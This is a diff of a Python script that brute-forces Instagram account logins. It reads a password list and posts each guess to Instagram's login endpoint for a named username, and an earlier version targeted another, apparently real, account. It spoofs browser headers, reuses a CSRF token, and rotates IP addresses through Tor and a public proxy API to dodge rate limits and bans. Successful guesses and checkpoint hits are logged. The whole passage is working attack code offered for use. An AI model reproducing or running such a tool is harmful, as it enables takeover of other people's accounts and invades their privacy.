@@ -46,25 +46,28 @@ def changeproxy():
     global proxies;
     ase = num
     khas = 1;
-    url = "http://192.168.1.101:3000/proxy%d"%(khas)
-    #url = "http://pubproxy.com/api/proxy?type=http&format=txt"
-    r = requests.get(url)
-    data = r.content;
-    print(data)
-    ehsi = "https://%s"%(data)
+    url = "https://api.getproxylist.com/proxy?protocol=http&?allowsPost=1"
+    r = requests.get(url,proxies={ 'https':'socks5h://localhost:9050','http':'socks5h://localhost:9050'})
+    data = r.json()
+    #rpox = ("%d:%d"%(data.ip,data.port))
+    hma = str(data['ip'])
+    sam = str(data['port'])
+    ssas = hma+':'+sam
+    print(ssas)
+    http = "http://"+ssas
+    https = "https://"+ssas
     proxies = {
-        'https': 'https://' + data
+        'https': https,
+        'http' : http
     }
     sqqw = requests.get("https://api.ipify.org",proxies=proxies)
-    sasa = data;
+    sasa = "188.213.181.225";
     sasas = sqqw.content;
-    if sasa in sasas:
-        print('ip changed')
+    if sasa not in sasas:
+        print(bcolors.OKGREEN+'ip changed')
     else:
         print('proxy not change tryagain')
-        khas =+ 1
         changeproxy()
-
 def get_csrf():
     """
     get CSRF token from login page to use in POST requests
@@ -102,7 +105,6 @@ def get_csrf():
 def start_brute():
     globalscop = randint(11111111,99999999)
     sakam = "Mozilla/5.0(X11; Ubuntu; Linu…)Gecko/%d Firefox/64.0"%(globalscop);
-    pro = open("proxy.txt","r").readlines()
     header = {
         "User-Agent": sakam,
         'X-Instagram-AJAX': '1',
@@ -112,12 +114,11 @@ def start_brute():
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         'Cookie': 'csrftoken=' + csrf_token
     }
-    f = open("password.txt","r").readlines()
     s = open("user.txt","r").readlines()
     asz = open("paired.txt","w+")
     for line in s:
         password = line.strip()
-        r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"hosnaa.83","password":password},headers=header,proxies=proxies)
+        r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"sinatestcrack3","password":password},headers=header,proxies=proxies)
         content = r.content;
         if "checkpoint_required" in content:
             print(bcolors.OKGREEN+'password found but need checkpoint | '+password)
